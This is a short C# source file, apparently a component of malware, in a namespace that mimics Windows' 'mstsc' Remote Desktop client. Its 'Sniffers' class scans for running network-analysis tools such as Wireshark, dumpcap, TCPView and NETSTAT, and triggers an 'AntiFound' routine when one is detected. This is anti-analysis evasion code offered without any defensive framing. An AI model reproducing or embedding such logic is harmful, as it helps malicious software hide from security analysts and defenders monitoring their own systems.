
namespace mstsc.Aries.Antis
{
sealed class Sniffers
    {
        public Sniffers()
        {
            CheckProcess proc = new CheckProcess();
            if (proc.IsProcessRunning("wireshark") || proc.IsProcessRunning("EtherD") || proc.IsProcessRunning("EtherDetect") ||
                proc.IsProcessRunning("The Wireshark Network Analyzer") || proc.IsProcessRunning("dumpcap") ||
                proc.IsProcessRunning("sysAnalyzer") || proc.IsProcessRunning("TCPView") ||
                proc.IsProcessRunning("Tcpview") || proc.IsProcessRunning(@"C:\Program Files\Wireshark\") ||
                proc.IsProcessRunning("NETSTAT") || proc.IsProcessRunning("sniff_hit"))
            {
                new AntiFound();
            }
            //System.GC.Collect();
        }
    }
}
